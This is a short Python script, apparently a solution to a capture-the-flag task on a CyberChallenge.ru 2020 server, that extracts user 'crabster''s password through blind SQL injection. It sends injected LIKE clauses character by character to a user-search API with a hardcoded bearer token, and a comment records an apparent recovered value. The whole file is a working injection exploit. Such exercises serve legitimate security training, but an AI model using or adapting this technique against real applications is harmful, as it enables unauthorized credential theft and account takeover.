import requests as r
import string

ascii_lp = string.ascii_letters + string.digits + "%"

sess = r.Session()

headers = {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MjEyMywiaWF0IjoxNjAwMTg3Mzk1LCJleHAiOjE2MDA3OTIxOTV9.TAylbVqkQRhTDX9Rs4NbZbRIVkcoH9jsA5b4KY5fy4c'
}

password = ''

for i in range(0, 10):
    for j in ascii_lp:
        params = (('username', f"i' or 1=2 or (username='crabster' and password like'{password + j}%') -- " ),)
        req = sess.get(
            'http://rave-bank.level-up.2020.tasks.cyberchallenge.ru/api/user/search',
            headers=headers,
            params = params,
            verify=False
        )
        if req.status_code == 200:
            if len(req.json()) > 0:
                print(f"Founded part of password: {password + j}, {req.json()}")
                break
        print(f"Checked {password + j}", end='\r')
    password += j
    #b0a3eaa4